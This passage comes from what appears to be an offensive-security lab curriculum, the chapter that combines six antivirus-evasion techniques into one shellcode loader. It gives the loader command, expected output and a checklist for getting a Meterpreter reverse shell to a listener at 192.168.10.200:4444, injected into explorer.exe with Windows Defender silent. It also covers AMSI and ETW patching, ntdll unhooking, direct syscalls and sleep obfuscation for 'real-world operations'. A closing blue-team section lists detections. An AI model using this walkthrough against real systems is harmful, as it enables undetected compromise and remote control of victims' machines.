[*] Meterpreter session 1 opened (192.168.10.200:4444 -> 192.168.10.100:xxxxx)

meterpreter >
```

You have a Meterpreter session with all six evasion layers active.

### Step 5b: Run in Remote Mode (Injection into Explorer)

On the target (kimjongun, 192.168.10.100), open an **Administrator Command Prompt**:
```
cd C:\Users\kimjongun\Desktop
stealth_loader.exe encrypted.bin 4A7F2B9DE3A1C084F56D1B8E97320AF6 explorer
```

Expected output:
```
=== Stealth Runner ===

[1/6] Patching telemetry...
      Telemetry patched. No events from this process.
[2/6] Patching scanner...
      Scanner patched. Content inspection disabled.
[3/6] Decrypting data...
      Decrypted 510 bytes in memory.
[4/6] Finding target process: explorer...
      Found PID: 4532
[5/6] Writing to explorer...
[6/6] Creating remote thread...
      Code running inside explorer (PID 4532).

=== Execution complete ===
```

On your Kali listener, you get the same Meterpreter session. But now, check which process the session runs in:

```
meterpreter > getpid
Current pid: 4532
```

The shellcode is running inside explorer.exe, not stealth_loader.exe. In Task Manager on the target, explorer.exe is the process using the network connection. stealth_loader.exe can exit after the injection, and the Meterpreter session stays alive inside explorer.exe.

**Defender does not catch this.** No alerts in Protection history. No quarantined files. No blocked operations.

## Confirming Success

### Full Confirmation Checklist

1. **Meterpreter session opened.** Your Kali listener shows a session. Run `sysinfo` to confirm you are on the target:
   ```
   meterpreter > sysinfo
   Computer    : DESKTOP-XXXXXXX
   OS          : Windows 11 (10.0 Build 22621)
   ```

2. **No Defender alerts.** On the target (kimjongun), open Windows Security, go to Virus & threat protection, then Protection history. There should be no new entries. Defender did not detect anything.

3. **In remote mode, check the process.** Run `getpid` in Meterpreter. The PID should match the target process (explorer.exe), not stealth_loader.exe.

4. **In remote mode, stealth_loader.exe can exit.** After the injection completes, stealth_loader.exe exits (the "=== Execution complete ===" message appears). The Meterpreter session inside explorer.exe stays alive. You can verify by closing the command prompt that ran stealth_loader.exe and checking that Meterpreter is still connected.

5. **Network connection comes from the target process.** On the target, run `netstat -b` in an Administrator Command Prompt. Look for the connection to 192.168.10.200:4444. In local mode, the connection belongs to stealth_loader.exe. In remote mode, it belongs to explorer.exe.

6. **Defender Scan.** To be thorough, run a manual Defender scan on the target. Open Windows Security, go to Virus & threat protection, click Quick scan. The scan should complete without finding stealth_loader.exe or the injected shellcode.

## What Was Gained

You can now:

- Combine all six evasion techniques into a single loader with correct execution order
- Explain why the execution order (ETW first, AMSI second, decrypt third, resolve fourth, allocate fifth, execute sixth) matters
- Run shellcode in local mode (current process) or remote mode (inject into another process)
- Use NtWriteVirtualMemory instead of WriteProcessMemory for remote injection via dynamic resolution
- Resolve OpenProcess dynamically so it does not appear in the import table
- Get a fully stealthy callback with Defender at full defaults and no detection alerts
- Explain which detection layers are active and how each step defeats them

This is the culmination of everything you learned in Documents 01 through 09. You started with a basic shellcode loader that Defender caught immediately, and you ended with a combined evasion loader that defeats all six detection layers and gives you a clean Meterpreter session inside a legitimate process.

The complete detection layer coverage:

| Detection layer | Status | How it was defeated |
|---|---|---|
| Static file scanning | Defeated | XOR encryption (Document 06) |
| Import table analysis | Defeated | Dynamic resolution (Document 07) |
| AMSI runtime scanning | Defeated | AmsiScanBuffer patch (Document 08) |
| ETW telemetry | Defeated | EtwEventWrite patch (Document 08) |
| API hooks in ntdll.dll | Reduced | NT functions via delegates (Document 07) |
| Behavioral ML | Defeated | Two-step allocation + clean imports + no ETW signals (Documents 07, 08) |

## Common Threats and Variations

### Variation 1: NTDLL Unhooking Instead of Dynamic Resolution

Instead of calling NT functions through the hooked ntdll.dll (which is what Loader 08 does), you can load a fresh, unhooked copy of ntdll.dll from disk. ntdll.dll exists on disk at C:\Windows\System32\ntdll.dll with no hooks. You can read this file into memory, map it manually (or use LoadLibrary with a different name), and resolve functions from the fresh copy. Because the fresh copy was never hooked by Defender, all functions execute without interception.

The benefit is that you completely bypass all API hooks, not just reduce their effectiveness. The downside is that loading a second copy of ntdll.dll into your process is detectable by EDR products that monitor module loading.

### Variation 2: Syscall Stubs from Disk

A variation of NTDLL unhooking is to read the syscall stub bytes (the `mov eax, <number>; syscall; ret` pattern) from the on-disk ntdll.dll and use those bytes directly. You do not need to map the entire DLL. Just read the first 20 or so bytes of each NT function from the file, extract the syscall number, and issue the `syscall` instruction from your own code.

This is what tools like SysWhispers3 and SysWhispers4 generate. They create assembly stubs with the correct syscall numbers for each Windows build.

### Variation 3: Sleep Obfuscation

After the shellcode is running, the Meterpreter session periodically sleeps (waits for the next check-in with Kali). During sleep, the shellcode's bytes are sitting in memory in readable form. If Defender does a periodic memory scan during a sleep, it could find the Meterpreter payload bytes and flag them.

Sleep obfuscation encrypts the shellcode bytes in memory during sleep periods and decrypts them when the session wakes up. This means the payload is only visible in memory during the brief periods when it is actively running, not during the longer sleep periods.

This is an advanced technique that requires modifying the Meterpreter payload or using a custom C2 framework. It is beyond the scope of this curriculum but is important to know about for real-world operations.

## Detection and Defense (Blue Team Perspective)

**Deploy kernel-level ETW monitoring.** The user-mode EtwEventWrite patch does not affect kernel-mode ETW. The Microsoft-Windows-Threat-Intelligence provider runs in the kernel and cannot be patched from user mode. It logs process creation, virtual memory operations, and image loads from kernel space.

Blue team action: deploy EDR products that consume the kernel-mode Threat Intelligence ETW provider. This defeats the user-mode ETW patch and provides visibility into all memory allocation, protection changes, and thread creation regardless of what the attacker patches in user mode.

**Implement code integrity checks on system DLLs.** Periodically compare the in-memory code of ntdll.dll and amsi.dll against their on-disk copies. Any difference means the DLL has been patched.

Blue team action: deploy an agent that periodically reads the code sections of ntdll.dll and amsi.dll from the disk file and compares them byte-for-byte against the loaded copies in each running process. Alert on any differences.

**Monitor for NtWriteVirtualMemory cross-process calls.** NtWriteVirtualMemory is the NT-level function for writing to another process's memory. Legitimate programs rarely use it (they use WriteProcessMemory through kernel32, which Defender hooks). If you detect a direct call to NtWriteVirtualMemory targeting another process, that is a strong injection signal.

Blue team action: use kernel callbacks (ObRegisterCallbacks) to monitor process handle creation with write access, and correlate with subsequent memory operations on that handle. This catches injection regardless of whether the attacker uses kernel32 or ntdll functions.

**Use Windows Defender Application Control (WDAC).** None of the evasion techniques in this curriculum work if the binary is not allowed to run in the first place. WDAC restricts which binaries can execute to a pre-approved list based on signatures, publishers, or file hashes. A custom-compiled loader will not be on the list and will be blocked before it can execute any code.

Blue team action: implement WDAC in production environments with a strict policy. Only signed binaries from trusted publishers should be permitted. This is the single most effective defense against custom loaders.

**Detect anomalous network connections from system processes.** In remote injection mode, the Meterpreter connection comes from explorer.exe or svchost.exe. These processes do make network connections normally, but the destination IP and port pattern may be unusual. A system process connecting to an unknown IP on port 4444 is suspicious.

Blue team action: baseline normal network behavior for system processes and alert on connections to IP addresses that do not match known update servers, CDNs, or business applications.

## What Comes Next

Document 11 (lab/materials/11_real_world_scenarios.md) covers real-world attack scenarios where these techniques are used. It explains how the techniques combine in actual red team engagements, what you encounter when facing third-party EDR products (not just Defender), and what the current state of evasion looks like as of September 2026.
